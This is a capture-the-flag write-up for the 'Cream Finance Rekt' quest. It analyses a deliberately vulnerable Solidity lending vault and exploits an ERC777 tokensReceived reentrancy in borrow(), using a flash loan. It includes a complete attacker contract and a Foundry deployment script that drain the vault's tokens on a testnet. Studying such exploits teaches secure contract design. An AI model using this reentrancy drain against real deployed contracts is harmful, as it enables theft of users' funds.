---
title: "Cream Finance Rekt"
date: "2024-02-14T14:27:00.000Z"
lastmod: "2024-03-19T16:52:00.000Z"
draft: false
featuredImage: "https://cdn.nodeguardians.io/backend-production/Cream_Rekt_part\
  1_1200px_812a079450/Cream_Rekt_part1_1200px_812a079450.webp"
weight: 3
difficulty: "🗡🗡🗡🗡"
language:
  - "Solidity"
next: "Poly-Network-Rekt-b7b8b11820c249bcb1f96a50fc20d478"
level-url: "https://nodeguardians.io/dev-hub/quests/cream-rekt"
type: "docs"
skill-cat:
  - "Security"
state: "Done"
about:
  - "reentrency"
  - "low-level calls"
prev: "Wintermute-Rekt-d0fd4609147941e6af7fcc68ef81da6a"
NOTION_METADATA:
  object: "page"
  id: "04ac5f09-eb5d-42c0-b28f-cdd8aabdc19d"
  created_time: "2024-02-14T14:27:00.000Z"
  last_edited_time: "2024-03-19T16:52:00.000Z"
  created_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  last_edited_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  cover:
    type: "external"
    external:
      url: "https://cdn.nodeguardians.io/backend-production/Cream_Rekt_part1_1200px_8\
        12a079450/Cream_Rekt_part1_1200px_812a079450.webp"
  icon:
    type: "emoji"
    emoji: "✅"
  parent:
    type: "database_id"
    database_id: "67ccfb28-aa7e-4248-9272-3d9732e4a83e"
  archived: false
  properties:
    weight:
      id: "%3BQ%60q"
      type: "number"
      number: 3
    difficulty:
      id: "%3DCqv"
      type: "status"
      status:
        id: "qV=s"
        name: "🗡🗡🗡🗡"
        color: "red"
    language:
      id: "Py%7Cy"
      type: "multi_select"
      multi_select:
        - id: "d01ac056-199f-4b78-96ee-583126c15462"
          name: "Solidity"
          color: "blue"
    next:
      id: "%60Q~a"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "Poly-Network-Rekt-b7b8b11820c249bcb1f96a50fc20d478"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Poly-Network-Rekt-b7b8b11820c249bcb1f96a50fc20d478"
          href: null
    level-url:
      id: "cjvw"
      type: "url"
      url: "https://nodeguardians.io/dev-hub/quests/cream-rekt"
    type:
      id: "khE_"
      type: "select"
      select:
        id: "Qq?l"
        name: "docs"
        color: "default"
    skill-cat:
      id: "n%7CzF"
      type: "multi_select"
      multi_select:
        - id: "8fe662a4-5f8b-4be9-8013-c00b51082782"
          name: "Security"
          color: "green"
    state:
      id: "sW%3AG"
      type: "status"
      status:
        id: "372c6056-56a9-4d05-861f-a165f80174eb"
        name: "Done"
        color: "green"
    about:
      id: "vf%7DG"
      type: "multi_select"
      multi_select:
        - id: "14a70ab5-75ce-4cdb-baad-c40de6b3d3ee"
          name: "reentrency"
          color: "default"
        - id: "417c6433-6e36-4f26-9d1b-87b840c4a8c8"
          name: "low-level calls"
          color: "green"
    prev:
      id: "~LUC"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "Wintermute-Rekt-d0fd4609147941e6af7fcc68ef81da6a"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Wintermute-Rekt-d0fd4609147941e6af7fcc68ef81da6a"
          href: null
    title:
      id: "title"
      type: "title"
      title:
        - type: "text"
          text:
            content: "Cream Finance Rekt"
            link: null
          annotations:
            bold: true
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Cream Finance Rekt"
          href: null
  url: "https://www.notion.so/Cream-Finance-Rekt-04ac5f09eb5d42c0b28fcdd8aabdc19d"
  public_url: null
UPDATE_TIME: "2024-03-19T16:54:10.663Z"
EXPIRY_TIME: "2024-03-19T17:54:04.254Z"

---
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/katex.min.css" integrity="sha384-bYdxxUwYipFNohQlHt0bjN/LCpueqWz13HufFEV1SUatKs1cm4L6fFgCi1jT643X" crossorigin="anonymous">


<u>**Rekt article:**</u> [https://rekt.news/cream-rekt/](https://rekt.news/cream-rekt/)


The goal of this challenge is to seize all of the $SEAGOLD supply from `SharkVault`.


![](/images/379abe9f-63f6-45bf-8f6c-abe200f42288.png)


From the subject, we can understand that we are able to request for overcollateralized loan to the shark vault.


![](/images/b3f31e34-7ec2-4ac1-b250-14b5931c4976.png)


We can then repay the loan in the opposite direction and withdraw our collateral - fees.


![](/images/673f0a47-d91f-4873-af73-f62ccb0b7b59.png)


Finally, their is a liquidation mecanism if the position become undercollateralized.


First thing first, I want to have a look at the current state of the vault contract, here is a simple script to logs the current balances of Gold and Seagold of the Sharkvault:


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {Attack} from "../src/Attack.sol";

import {SharkVault, IERC20} from "../src/Attack.sol";

contract POC is Script {
    function run() external {

        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address INSTANCE = vm.envAddress("INSTANCE");

        vm.startBroadcast(deployerPrivateKey);


        SharkVault vault = SharkVault(INSTANCE);

        IERC20 gold = IERC20(vault.gold());
        IERC20 seagold = IERC20(vault.seagold());

        console.logAddress(address(gold)); // logs the gold token address
        console.logAddress(address(seagold)); // logs the seagold token address
        console.logUint(gold.balanceOf(address(vault))); // logs the amount gold in the vault
        console.logUint(seagold.balanceOf(address(vault))); // logs the amount of seagold in the vault


        vm.stopBroadcast();
    }
}
```


which gives me the following output :


![](/images/d77a8fc9-bff8-4e31-8f60-59bb6cbce852.png)


So there are 3000000000000000000000 unit of $Seagold in the contract to be stolen !


Now here is the vault contract code :


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/interfaces/IERC20.sol";

contract SharkVault {

    // The Shark charges predatory interest rates...
    uint256 constant public INTEREST_RATE_PERCENT = 1;

    IERC20 immutable public gold;
    IERC20 immutable public seagold;

    struct LoanAccount {
        uint256 depositedGold;
        uint256 borrowedSeagold;
        uint256 lastBlock;
    }

    mapping(address => LoanAccount) private accounts;

    constructor(
        IERC20 _gold,
        IERC20 _seagold
    ) {
        gold =  _gold;
        seagold = _seagold;
    }

    /**
     * @notice Deposit gold as collateral. 
     * @param _amount Amount of gold to deposit.
     * @dev Gold must be approved for transfer beforehand.
     */
    function depositGold(uint256 _amount) external payable {

        accounts[msg.sender].depositedGold += _amount;
        gold.transferFrom(msg.sender, address(this), _amount);

    }

    /**
     * @notice Withdraw gold collateral.
     * @param _amount Amount of gold to withdraw.
     * @dev Any existing seagold loan must still be 
     * sufficiently collateralized.
     */
    function withdrawGold(uint256 _amount) external payable {

        LoanAccount memory account = updatedAccount(msg.sender);
        account.depositedGold -= _amount;

        require(_hasEnoughCollateral(account), "Undercollateralized $SEAGLD loan");
        accounts[msg.sender] = account;

        gold.transfer(msg.sender, _amount);

    }

    /**
     * @notice Borrow seagold.
     * @param _amount Amount of seagold to borrow.
     * @dev Seagold loan have be suffciently collateralized 
     * by previously deposited gold.
     */
    function borrow(uint256 _amount) external {

        LoanAccount memory borrowerAccount = updatedAccount(msg.sender);
        borrowerAccount.borrowedSeagold += _amount;

        // Fail if insufficient remaining balance of $SEAGOLD
        uint256 seagoldBalance = seagold.balanceOf(address(this));
        require(_amount <= seagoldBalance, "Insufficient $SEAGLD to lend");

        // Fail if borrower has insufficient gold collateral
        require(_hasEnoughCollateral(borrowerAccount), "Undercollateralized $SEAGLD loan");

        // Transfer $SEAGOLD and update records
        seagold.transfer(msg.sender, _amount);
        accounts[msg.sender] = borrowerAccount;

    }

    /**
     * @notice Repay borrowed seagold.
     * @param _amount Amount of seagold to repay.
     * @dev Seagold must be approved for transfer beforehand.
     */
    function repay(uint256 _amount) external {

        LoanAccount memory account = updatedAccount(msg.sender);
        account.borrowedSeagold -= _amount;
        accounts[msg.sender] = account;

        seagold.transferFrom(msg.sender, address(this), _amount);

    }

    /**
     * @notice Liquidate an existing undercollateralized loan. 
     * The smart contract effectively seizes the gold collateral.
     * @param _borrower Owner of the loan.
     */
    function liquidate(address _borrower) external {

        LoanAccount memory borrowerAccount = updatedAccount(_borrower);

        require(!_hasEnoughCollateral(borrowerAccount), "Borrower has good collateral");
        delete accounts[_borrower];

    }

    /**
     * @notice Get the loan account of a user, with updated interest.
     * @param _accountOwner Owner of the loan.
     */
    function updatedAccount(
        address _accountOwner
    ) public view returns (LoanAccount memory account) {

        account = accounts[_accountOwner];

        if (account.borrowedSeagold > 0) {
            uint256 blockDelta = block.number - account.lastBlock;
            uint256 interest = account.borrowedSeagold * blockDelta 
                * INTEREST_RATE_PERCENT / 100;

            account.depositedGold = (account.depositedGold >= interest) 
                ? account.depositedGold - interest 
                : 0;
        }

        account.lastBlock = block.number;

    }

    /**
     * @dev Returns true if `_account` is sufficiently collateralized by gold.
     * Collateral ratio => 1 GOLD : 0.75 SEAGOLD
     */
    function _hasEnoughCollateral(LoanAccount memory _account) private pure returns (bool) {

        return (3 * _account.depositedGold >= 4 * _account.borrowedSeagold);
        
    }


}
```


From reding the Cream Finance post moterm, we can easily suppose that their is a reentrancy vulnerability inside this contract so I’m looking for any miss ordered `[Checks → Effects → Interactions]` pattern in the contract. 


You can find nice description of this pattern inside the solidity documentation: 


![](/images/34f88230-0d68-4fbe-9cb3-85f673eff7fe.png)


In other word, we want to find something in the contract that update the internal state of the contract after talking with the outside world.


And here we have it :


```solidity
 function borrow(uint256 _amount) external {

        LoanAccount memory borrowerAccount = updatedAccount(msg.sender); // local state
        borrowerAccount.borrowedSeagold += _amount; // local state

        // Fail if insufficient remaining balance of $SEAGOLD
        uint256 seagoldBalance = seagold.balanceOf(address(this)); // local state
        require(_amount <= seagoldBalance, "Insufficient $SEAGLD to lend"); // 1st Check

        // Fail if borrower has insufficient gold collateral
        require(_hasEnoughCollateral(borrowerAccount), "Undercollateralized $SEAGLD loan"); // 2d Check

				//--- DANGER ZONE ---//
				
        // Transfer $SEAGOLD and update records
        seagold.transfer(msg.sender, _amount);  // Interaction (outside world communication)
        accounts[msg.sender] = borrowerAccount; // Effect (internal state change)

    }
```


Those last two line are very dangerous since transfer can be done to any malicious contract that will recall the borrow function before the `accounnts[msg.sender]` state is updated, breaking the internal state logic of the contract !


The first line of the method calls `updatedAccount` here you have the code of this method :


```solidity
function updatedAccount(
        address _accountOwner
    ) public view returns (LoanAccount memory account) {

        // we can't rely on this value
        // since borrow can be called multiple times (recursion pattern)
        // before it updates the accounts
				account = accounts[_accountOwner];

        if (account.borrowedSeagold > 0) {
            uint256 blockDelta = block.number - account.lastBlock;
            uint256 interest = account.borrowedSeagold * blockDelta 
                * INTEREST_RATE_PERCENT / 100;

            account.depositedGold = (account.depositedGold >= interest) 
                ? account.depositedGold - interest 
                : 0;
        }

        account.lastBlock = block.number;

    }

```


but this call presuppose that `account = accounts[_accountOwner];` is the correct value, which we know is wrong since we can call `borrow` as many time as we want without changing the `accounts[msg.sender]` .


Now, we know there is a vulnerability inside the Sharkvault contract. In order to interact with the borrow method, we first need to deposit some $Gold collateral into it. Don’t forget that we have access to another contract:  the flash lender !


![](/images/933ad9cf-d32b-4df5-90c7-e1468c891042.png)


Let’s see how many $Gold we can get from the flash loan:


![](/images/890f84cd-9c23-471d-91f8-eb71c84fa3df.png)


So, 1 000 Gold token.


And we want to still 3 000 SeaGold.


It is said that : For every `1000` Gold deposited, users can borrow up to `75` Seagold.


So we’ll be able to `borrow` 750 Seagold on each call which is perfet since 3 000 / 750 = 4 !


So, here are the step I’m going to implement;

1. Ask for a flash loan of `1000` Gold to the falsh lender
1. Deposit the `1000` Gold from the Flashloan contract into the SharkVault contract
1. Make a `borrow()` of 0 SeaGold so I don’t have to repay anything at the end of the call call
1. Call `borrow()` 750 SeaGold x4 thanks to the contract breach
1. Withdraw the `1000` Gold from the SharkVault contract and repay back the Flashloan contract

![](/images/630c228c-fb29-42c5-b7f1-1a4803b034c9.png)


Here is another point of view from a contract state perspective:


 


![](/images/766206a6-f30b-45f4-9feb-0d6069f2a0d7.gif)


you can play with the animation here 


[image](https://prod-files-secure.s3.us-west-2.amazonaws.com/00345c33-b7f7-443a-aca8-598247fb6d93/e53c7ace-a866-4ff8-b2d0-377d311be1ff/excalidraw-claymate%283%29.html?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20240319%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240319T165404Z&X-Amz-Expires=3600&X-Amz-Signature=1286b70636a80314858b561e03f76b2bdca2d34cf722afa99ac27a797d950d95&X-Amz-SignedHeaders=host&x-id=GetObject)


Now it still remains one problem, how to take advantage of the Seagold `transfer` method ?


We can take a look at the decompiled version of the function from goerliscan :


```solidity
def transfer(address _to, uint256 _value) payable: 
  require calldata.size - 4 >=ΓÇ▓ 64
  require _to == _to
  require _value == _value
  if not caller:
      revert with 0, 'ERC777: transfer from the zero address'
  if not _to:
      revert with 0, 'ERC777: transfer to the zero address'
  static call 0x1820a4b7618bde71dce8cdc73aab6c95905fad24.getInterfaceImplementer(address addr, bytes32 interfaceHash) with:
          gas gas_remaining wei
         args caller, 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895
  if not ext_call.success:
      revert with ext_call.return_data[0 len return_data.size]
  require return_data.size >=ΓÇ▓ 32
  require ext_call.return_data == ext_call.return_data[12 len 20]
  if ext_call.return_data[12 len 20]:
      require ext_code.size(addr(ext_call.return_data))
      call addr(ext_call.return_data).tokensToSend(address param1, address param2, address param3, uint256 param4, bytes param5, bytes param6) with:
           gas gas_remaining wei
          args caller, caller, addr(_to), _value, 192, 224, 0, 0
      if not ext_call.success:
          revert with ext_call.return_data[0 len return_data.size]
  if balanceOf[caller] < _value:
      revert with 0, 'ERC777: transfer amount exceeds balance'
  balanceOf[caller] -= _value
  if balanceOf[addr(_to)] > balanceOf[addr(_to)] + _value:
      revert with 'NH{q', 17
  balanceOf[addr(_to)] += _value
  log Sent(address operator, address from, address to, uint256 amount, bytes holderData, bytes operatorData):
           _value,
           96,
           128,
           0,
           0,
           caller,
           caller,
           _to,
  log Transfer(
        address from=_value,
        address to=caller,
        uint256 tokens=_to)
  static call 0x1820a4b7618bde71dce8cdc73aab6c95905fad24.getInterfaceImplementer(address addr, bytes32 interfaceHash) with:
          gas gas_remaining wei
         args addr(_to), 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b
  if not ext_call.success:
      revert with ext_call.return_data[0 len return_data.size]
  require return_data.size >=ΓÇ▓ 32
  require ext_call.return_data == ext_call.return_data[12 len 20]
  if ext_call.return_data[12 len 20]:
      require ext_code.size(addr(ext_call.return_data))
      call addr(ext_call.return_data).tokensReceived(address param1, address param2, address param3, uint256 param4, bytes param5, bytes param6) with:
           gas gas_remaining wei
          args caller, caller, addr(_to), _value, 192, 224, 0, 0
      if not ext_call.success:
          revert with ext_call.return_data[0 len return_data.size]
  return 1
```


and the first transaction log from my first POC (see further below) we can see that their is some call to `getInterfaceImplementer()` function:


![](/images/427c63e2-b8fe-4244-81c2-e8726a8c6a11.png)


Here is the correponding eip : [https://eips.ethereum.org/EIPS/eip-1820](https://eips.ethereum.org/EIPS/eip-1820)


Back to the decompiled code:


```solidity
static call 0x1820a4b7618bde71dce8cdc73aab6c95905fad24.getInterfaceImplementer(address addr, bytes32 interfaceHash) with:
          gas gas_remaining wei
         args addr(_to), 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b
```


after a quick google search we can find that:


![](/images/b85d9ee1-db3e-4f34-a986-0b8ab8f7f018.png)


[bookmark](https://docs.openzeppelin.com/contracts/3.x/erc777)


So apparently, Seagold is not just an ERC20 but rather an ERC777


The question is: How can we trigger a fallback like functionality from ERC777 transfer call ?


[https://ethereum.stackexchange.com/a/84702](https://ethereum.stackexchange.com/a/84702)


Here we have it :


[bookmark](https://github.com/Dawn-Protocol/dawn-erc20-erc777/blob/master/contracts/Staking.sol#L243)


We can clearly see here that if we implement the tokensReceived function we can have a re-entrancy attack:


![](/images/a92b9812-e364-4481-a5e4-d551245477ff.png)


So let’s implement the function in our flashloan contract + we can see that the address is called on  the return data which is the _to address from the params of the function which is msg.sender which is our flash loan contract !


![](/images/ca7dfac6-2e86-42e5-91a2-a9ba70189cbe.png)


Once we have implemented the function there is still one thing to do:


![](/images/a3c117a4-c87e-441e-81ee-8b43f01fa31c.png)


We can see that there is no interface implementer registered, so there are no call that is made here :


```solidity
if ext_call.return_data[12 len 20]:
      require ext_code.size(addr(ext_call.return_data))
      call addr(ext_call.return_data).tokensReceived(address param1, address param2, address param3, uint256 param4, bytes param5, bytes param6) with:
           gas gas_remaining wei
          args caller, caller, addr(_to), _value, 192, 224, 0, 0
```


ext_call.return_data is the result of getInterfaceImplementer.


So first we have to find a way to add an interface implementer in the ERC1830Registry.


We can do so with the following function:


```solidity
/// @notice Sets the contract which implements a specific interface for an address.
/// Only the manager defined for that address can set it.
/// (Each address is the manager for itself until it sets a new manager.)
/// @param _addr Address for which to set the interface.
/// (If '_addr' is the zero address then 'msg.sender' is assumed.)
/// @param _interfaceHash Keccak256 hash of the name of the interface as a string.
/// E.g., 'web3.utils.keccak256("ERC777TokensRecipient")' for the 'ERC777TokensRecipient' interface.
/// @param _implementer Contract address implementing '_interfaceHash' for '_addr'.
function setInterfaceImplementer(address _addr, bytes32 _interfaceHash, address _implementer) external {
    address addr = _addr == address(0) ? msg.sender : _addr;
    require(getManager(addr) == msg.sender, "Not the manager");

    require(!isERC165Interface(_interfaceHash), "Must not be an ERC165 hash");
    if (_implementer != address(0) && _implementer != msg.sender) {
        require(
            ERC1820ImplementerInterface(_implementer)
                .canImplementInterfaceForAddress(_interfaceHash, addr) == ERC1820_ACCEPT_MAGIC,
            "Does not implement the interface"
        );
    }
    interfaces[addr][_interfaceHash] = _implementer;
    emit InterfaceImplementerSet(addr, _interfaceHash, _implementer);
}
```


→ _addr (FlashLoan address)


→ _interfaceHash (0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b)


→ _interfaceHash (FlashLoan address)


So here is the call I make :


```solidity
ERC1820Registry registry = ERC1820Registry(REGISTRY);
registry.setInterfaceImplementer(address(flashLoan), 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b, address(flashLoan));
```


but I felt onto:


![](/images/8df87b9b-3bbf-40b6-a273-28ceb0f98bd3.png)


Question: who is the manager ?


It turns out that a contract is its own manager ! hehe


So I moved my code inside my FlashLoan attacker 😈


And here is a first peek at my set up:


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// Here we can find the standard interface for the ERC20. Don't forget that we find
// out that the seagold is actually an ERC777 token !
interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

// This is the registry that tells for a given contract which interface its supports
// There is a getter and a setter.
// The manager of a contrat is the contract itself by default.
interface ERC1820Registry {
	function getInterfaceImplementer(address _addr, bytes32 _interfaceHash) external view returns (address);
  function setInterfaceImplementer(address _addr, bytes32 _interfaceHash, address _implementer) external;
}

// This is the vault we are going to attack
interface SharkVault {
    // The Shark charges predatory interest rates...
    function INTEREST_RATE_PERCENT() external returns(uint256);

    function gold() external returns(address);
    function seagold() external returns(address);

    struct LoanAccount {
        uint256 depositedGold;
        uint256 borrowedSeagold;
        uint256 lastBlock;
    }
    function depositGold(uint256 _amount) external ;
    function withdrawGold(uint256 _amount) external payable;
    function borrow(uint256 _amount) external;
    function repay(uint256 _amount) external;
    function liquidate(address _borrower) external;
    function updatedAccount(
        address _accountOwner
    ) external view returns (LoanAccount memory account);
}

// This is one of the interface of our attacker contract.
// onFlashLoan will be called by the FlashLender (see the next interface)
// when this function is called we actually have the gold token in the 
// attacker contract
interface IERC3156FlashBorrower {
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32);
}

// This one is the interface for the flash loan borrower.
// This is where we find the initial golds that will boostrap the whole attack
// and the ones that we have to repay at the end of the flashloan (+ fee) but there
// is no fees in this scenario.
interface IERC3156FlashLender {

    function maxFlashLoan(
        address token
    ) external view returns (uint256);

    function flashFee(
        address token,
        uint256 amount
    ) external view returns (uint256);

    function flashLoan(
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);
}

// This is the second interface that our FlashLoan contract implement
// It is basically where the re-entrancy attack begins !
interface IERC777TokensRecipient {
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external;
}


// And there it is ! The FlashLoan attacker contract wich implements the whole
// attack logic
contract FlashLoan is IERC3156FlashBorrower, IERC777TokensRecipient {

    IERC20 gold;
    IERC20 seagold;
    IERC3156FlashLender flashLender;
    SharkVault vault;
    bool pwned;
    ERC1820Registry registry;

		// First, we get all the utilities we will need to access during the attack
    constructor(address _flashLender, address _gold, address _seagold, address _vault, address _registry) {
      gold = IERC20(_gold);
      seagold = IERC20(_seagold);
      flashLender = IERC3156FlashLender(_flashLender);
      vault = SharkVault(_vault);
      registry = ERC1820Registry(_registry);
    }

		// The attack is in two phases:
		// - 1) State that the contract implement the interface for the tokenReceived method
		//      in the ERC1820 registry
	  // - 2) Launch the actual attack starting with the flashloan on the Flash Lender contract
    function attack() public {
      registry.setInterfaceImplementer(address(0), 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b, address(this));
      uint maxAmount = flashLender.maxFlashLoan(address(gold));
      flashLender.flashLoan(this, address(gold), maxAmount, abi.encode(0));
    }

		// Once the loan is authorized by the Flash Lender it calls this function
    // on the our flash loan attacker contract
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata 
    ) public returns (bytes32) {
			// Those are almost useless check
      require(initiator == address(this), 'Wrong initiator');
      require(token == address(gold), 'Not gold');
      require(fee == 0, 'Fee must be 0');

			// First we deposit the gold token into the vault as collateral
      require(gold.approve(address(vault), amount));
      vault.depositGold(amount);
			
			// Then we borrow some seagold
			// if everyting is fine the function to be called is tokenReceived down
			// bellow
			// The first borrow is intentionally of 0 since when we are going to 
			// depop from the stack it's going to be the last value... So we'll
			// have nothing to repay in order to leave the shark vault :)
      vault.borrow(0 ether);
			
			// This is called only once the recursion is over
			// And it correspond to the withdrawing of the collateral from the 
			// shark vault
      vault.withdrawGold(amount);
			
			// Finally we can approve the gold transfer in order to repay the initial
			// loan made to the Flash Lender !
      require(gold.approve(address(flashLender), amount));
			// And don't forget to return the expected hash:
      return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function tokensReceived(
      address,
      address,
      address,
      uint256 ,
      bytes calldata,
      bytes calldata
    ) external {
      uint amount = seagold.balanceOf(address(vault));
			// classic recursion pattern to prevent infinte loop
      if (amount == 0) {
        return;
      }
			// since there is 1000 ether of collateral 750 is the max amount we can borrow
      vault.borrow(750 ether);
    }

}
```


And here is the deployment script:


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";


import {SharkVault, IERC20, FlashLoan} from "../src/Attack.sol";

contract POC is Script {
    function run() external {

        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address INSTANCE = vm.envAddress("INSTANCE");
        address FLASH_LENDER = vm.envAddress("FLASH_LENDER");
        address REGISTRY = vm.envAddress("ERC1820REGISTRY");

        vm.startBroadcast(deployerPrivateKey);

        SharkVault vault = SharkVault(INSTANCE);

        IERC20 gold = IERC20(vault.gold());
        IERC20 seagold = IERC20(vault.seagold());

        FlashLoan flashLoan = new FlashLoan(FLASH_LENDER, address(gold), address(seagold), address(vault), REGISTRY);

        console.logAddress(address(gold));
        console.logAddress(address(seagold));
        console.logUint(gold.balanceOf(address(vault)));
        console.logUint(seagold.balanceOf(address(vault)));

        flashLoan.attack();

        console.logUint(seagold.balanceOf(address(vault)));

        vm.stopBroadcast();
    }
}
```


```solidity
forge script script/Shark.s.sol --rpc-url $GOERLI_RPC_URL -vvvv --broadcast --verify
```


<u>**Refs**</u>:

- [ERC-3156: Flash Loans](https://eips.ethereum.org/EIPS/eip-3156)

![](/images/178ae4f1-c8c0-4d72-b2e0-4ea382dde02f.png)

